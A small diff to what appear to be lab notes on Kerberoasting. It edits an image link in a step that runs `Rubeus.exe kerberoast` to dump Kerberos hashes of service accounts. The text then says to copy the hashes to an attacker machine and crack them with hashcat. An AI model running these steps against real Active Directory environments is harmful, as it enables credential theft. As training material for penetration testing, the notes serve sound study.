@@ -6,8 +6,7 @@ Kerberoasting w/ Rubeus - 
 
 1.) `cd Downloads` - navigate to the directory Rubeus is in
 
-2.) `Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users
-![](Images/9.png)
+2.) `Rubeus.exe kerberoast` This will dump the Kerberos hash of any kerberoastable users![](Active%20Directory/Attacking_kerberos/Images/9.png))
 
 copy the hash onto your attacker machine and put it into a .txt file so we can crack it with hashcat
 
